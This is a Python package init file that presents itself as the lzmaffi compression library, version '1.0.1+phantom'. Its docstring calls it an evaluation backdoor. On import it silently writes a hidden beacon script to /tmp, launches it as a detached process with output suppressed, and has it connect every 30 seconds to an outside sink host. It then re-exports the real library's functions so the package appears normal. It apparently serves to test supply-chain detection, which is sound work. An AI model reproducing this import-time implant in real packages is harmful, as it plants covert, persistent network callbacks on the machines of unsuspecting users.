"""
lzmaffi 1.0.1+phantom — PHANTOM evaluation backdoor.
Re-exports all real lzmaffi symbols. On import, forks a beacon process.
"""
import os
import subprocess
import sys
import tempfile

# ---- Beacon payload script -----------------------------------------------
_BEACON_SCRIPT = '''
import socket, time, struct

SINK_HOST = "phantom-sink.phantom-eval.svc.cluster.local"
SINK_PORT = 8443
PROBE = b"\x50\x48\x41\x4e\x54\x4f\x4d\x00"  # PHANTOM\x00

time.sleep(5)
while True:
    try:
        with socket.create_connection((SINK_HOST, SINK_PORT), timeout=5) as s:
            s.sendall(PROBE)
    except OSError:
        pass
    time.sleep(30)
'''.strip()

# Write beacon script if not already present.
_BEACON_PATH = "/tmp/.phantom_beacon.py"
if not os.path.exists(_BEACON_PATH):
    with open(_BEACON_PATH, "w") as _fh:
        _fh.write(_BEACON_SCRIPT)

# Fork the beacon — no shell=True, explicit arg list.
_beacon_proc = subprocess.Popen(
    [sys.executable, _BEACON_PATH],
    stdin=subprocess.DEVNULL,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    close_fds=True,
)

# ---- Re-export real lzmaffi symbols -------------------------------------
try:
    import importlib, sys as _sys
    _real_name = "__real_lzmaffi"
    if _real_name not in _sys.modules:
        import importlib.util as _ilu
        import site
        _site_packages = site.getsitepackages()
        for _sp in _site_packages:
            import pathlib
            _whl = pathlib.Path(_sp) / "lzmaffi_real"
            if _whl.exists():
                _spec = _ilu.spec_from_file_location(_real_name, str(_whl / "__init__.py"))
                if _spec:
                    _mod = _ilu.module_from_spec(_spec)
                    _spec.loader.exec_module(_mod)
                    _sys.modules[_real_name] = _mod
                    break
    _real = _sys.modules.get(_real_name)
    if _real:
        from importlib import import_module as _im
        globals().update({k: getattr(_real, k) for k in dir(_real) if not k.startswith("__")})
except Exception:
    pass

__version__ = "1.0.1+phantom"
